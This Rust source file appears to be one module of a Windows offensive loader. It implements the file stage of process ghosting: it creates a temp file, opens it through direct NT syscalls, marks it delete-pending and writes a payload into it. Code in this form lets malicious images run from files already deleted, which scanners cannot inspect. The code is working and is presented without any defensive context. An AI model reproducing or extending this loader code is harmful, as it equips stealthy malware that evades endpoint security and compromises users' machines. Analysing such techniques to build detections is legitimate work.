use alloc::vec;
use alloc::vec::Vec;
use core::mem::zeroed;
use core::ptr::null_mut;
use ntapi::{
    ntioapi::{
        FILE_DISPOSITION_INFORMATION, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT,
        FileDispositionInformation, IO_STATUS_BLOCK,
    },
    ntrtl::RtlInitUnicodeString,
};
use windows_sys::Win32::{
    Foundation::{MAX_PATH, UNICODE_STRING},
    Storage::FileSystem::{
        DELETE, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
        GetTempFileNameW, GetTempPathW, SYNCHRONIZE,
    },
    System::{Kernel::OBJ_CASE_INSENSITIVE, WindowsProgramming::OBJECT_ATTRIBUTES},
};

use crate::{log, syscall};

const PREFIX: [u16; 3] = [b'P' as u16, b'G' as u16, 0];
const NT_PREFIX: &[u16] = &[b'\\' as u16, b'?' as u16, b'?' as u16, b'\\' as u16];

pub unsafe fn create_temp_file(nt_prefix: bool) -> Vec<u16> {
    unsafe {
        let mut tmp_path: [u16; MAX_PATH as usize] = [0; MAX_PATH as usize];
        let mut tmp_file_name: [u16; MAX_PATH as usize] = [0; MAX_PATH as usize];
        let mut tmp_file_path: Vec<u16> = vec![0; (MAX_PATH * 2) as usize];

        GetTempPathW(MAX_PATH, tmp_path.as_mut_ptr());
        GetTempFileNameW(
            tmp_path.as_ptr(),
            PREFIX.as_ptr(),
            0,
            tmp_file_name.as_mut_ptr(),
        );

        let mut idx = 0;
        if nt_prefix {
            for &c in NT_PREFIX {
                tmp_file_path[idx] = c;
                idx += 1;
            }
        }
        for &c in tmp_file_name.iter() {
            if c == 0 {
                break;
            }
            tmp_file_path[idx] = c;
            idx += 1;
        }
        tmp_file_path[idx] = 0;

        log!("NT Path: {:?}", tmp_file_path);
        tmp_file_path
    }
}

pub unsafe fn open_and_prepare_temp_file(nt_path: &[u16]) -> Option<isize> {
    unsafe {
        let mut file_handle: isize = 0;
        let mut io_status_block: IO_STATUS_BLOCK = zeroed();
        let mut file_name_unicode: UNICODE_STRING = zeroed();
        let mut object_attr: OBJECT_ATTRIBUTES = zeroed();

        RtlInitUnicodeString(
            &mut file_name_unicode as *mut UNICODE_STRING as _,
            nt_path.as_ptr(),
        );
        initialize_object_attributes(
            &mut object_attr,
            &mut file_name_unicode,
            OBJ_CASE_INSENSITIVE as u32,
            0,
            null_mut(),
        );

        let status = syscall!(
            "NtOpenFile",
            &mut file_handle as *mut isize as *mut usize,
            DELETE | FILE_GENERIC_WRITE | FILE_GENERIC_READ | SYNCHRONIZE,
            &mut object_attr,
            &mut io_status_block,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
        );

        if status < 0 {
            log!("NtOpenFile failed: 0x{:X}", status as u32);
            return None;
        }

        log!("NtOpenFile succeeded. Handle = 0x{:X}", file_handle);

        let mut file_disp_info = FILE_DISPOSITION_INFORMATION { DeleteFileA: 1 };

        let status = syscall!(
            "NtSetInformationFile",
            file_handle,
            &mut io_status_block,
            &mut file_disp_info,
            size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
            FileDispositionInformation
        );

        if status < 0 {
            log!("NtSetInformationFile failed: 0x{:X}", status as u32);
            syscall!("NtClose", file_handle);
            return None;
        }

        log!("NtSetInformationFile succeeded. File marked for delete.");
        Some(file_handle)
    }
}

pub unsafe fn write_payload(file_handle: isize, payload: &[u8]) -> bool {
    unsafe {
        let mut io_status_block: IO_STATUS_BLOCK = zeroed();

        let status = syscall!(
            "NtWriteFile",
            file_handle,
            null_mut::<u8>(),
            0,
            null_mut::<u8>(),
            &mut io_status_block,
            payload.as_ptr(),
            payload.len() as u32,
            null_mut::<u8>(),
            null_mut::<u8>()
        );

        if status < 0 {
            log!("NtWriteFile failed: 0x{:X}", status as u32);
            syscall!("NtClose", file_handle);
            return false;
        }

        log!("NtWriteFile succeeded. Wrote {} bytes.", payload.len());
        true
    }
}

pub unsafe fn initialize_object_attributes(
    obj_attr: *mut OBJECT_ATTRIBUTES,
    name: *mut UNICODE_STRING,
    attributes: u32,
    root: isize,
    security_descriptor: *mut core::ffi::c_void,
) {
    unsafe {
        (*obj_attr).Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
        (*obj_attr).RootDirectory = root;
        (*obj_attr).Attributes = attributes;
        (*obj_attr).ObjectName = name;
        (*obj_attr).SecurityDescriptor = security_descriptor;
        (*obj_attr).SecurityQualityOfService = null_mut();
    }
}
